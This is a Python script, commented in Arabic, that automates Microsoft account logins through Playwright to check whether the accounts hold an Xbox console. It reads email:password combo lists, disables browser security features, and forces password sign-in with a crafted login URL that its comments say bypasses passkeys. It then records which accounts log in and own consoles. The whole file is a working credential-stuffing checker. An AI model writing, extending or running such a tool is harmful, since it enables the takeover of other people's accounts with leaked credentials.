import asyncio
from playwright.async_api import async_playwright
from typing import Dict, List, Tuple
from datetime import datetime

DEFAULT_TIMEOUT = 60000

async def check_console(page) -> Tuple[bool, str, bool]:
    try:
        await page.goto("https://www.xbox.com/en-US/play/consoles", timeout=30000)
        await page.wait_for_load_state("networkidle")
        text = (await page.inner_text('body')).lower()
        if "play your console remotely" in text:
            return True, "يوجد جهاز Xbox", True
        if "set up your console" in text:
            return False, "تم تسجيل الدخول ولا يوجد جهاز", True
        if "sign in to finish setting up" in text:
            return False, "تسجيل الدخول غير مكتمل", False
    except:
        pass
    return False, "فشل في التحقق", False

async def process_account(account: Dict, headless: bool = True) -> Dict:
    result = {
        'email': account['email'],
        'password': account['password'],
        'success': False,
        'has_console': False,
        'console_info': '',
        'timestamp': datetime.now().isoformat()
    }
    p = None
    try:
        p = await async_playwright().start()
        browser = await p.chromium.launch(
            headless=headless,
            args=[
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-features=WebAuthentication',
                '--disable-web-security'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()

        # بناء الرابط المباشر مع login_hint (يتجاوز Passkey)
        login_url = (
            "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=16&rver=7.0.0000.0"
            "&wp=MBI_SSL&wreply=https%3A%2F%2Fwww.xbox.com%2Fen-US%2Fplay%2Fconsoles"
            f"&id=292540&prompt=login&amr=password&login_hint={account['email']}"
        )
        await page.goto(login_url, timeout=DEFAULT_TIMEOUT)
        await page.wait_for_load_state("networkidle")

        # بعد هذا الرابط، من المفترض أن نرى حقل كلمة المرور مباشرة
        try:
            await page.wait_for_selector("input[name='passwd']", timeout=15000)
            await page.fill("input[name='passwd']", account['password'])
            await asyncio.sleep(5)
        except Exception as e:
            # إذا لم يظهر حقل كلمة المرور، قد يكون هناك "Sign in another way"
            if await page.locator("button:has-text('Sign in another way')").count() > 0:
                await page.click("button:has-text('Sign in another way')")
                await page.wait_for_load_state("networkidle")
                await asyncio.sleep(2)
                await page.click("button:has-text('Use your password')")
                await page.wait_for_selector("input[name='passwd']", timeout=10000)
                await page.fill("input[name='passwd']", account['password'])
                await asyncio.sleep(5)
            else:
                raise e

        # الضغط على زر تسجيل الدخول
        await page.click("input[type='submit']")
        await page.wait_for_load_state("networkidle")

        # تجاوز "Stay signed in"
        try:
            if await page.locator("input[value='Yes']").count() > 0:
                await page.click("input[value='Yes']")
        except:
            pass

        has_console, console_info, login_success = await check_console(page)
        result['success'] = login_success
        result['has_console'] = has_console
        result['console_info'] = console_info

        await browser.close()
        await p.stop()
    except Exception as e:
        result['console_info'] = f"خطأ: {str(e)[:100]}"
        if p:
            await p.stop()
    return result

def parse_accounts_from_text(content: str) -> List[Dict]:
    accounts = []
    for line in content.splitlines():
        line = line.strip()
        if ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append({'email': email.strip(), 'password': pwd.strip()})
    return accounts
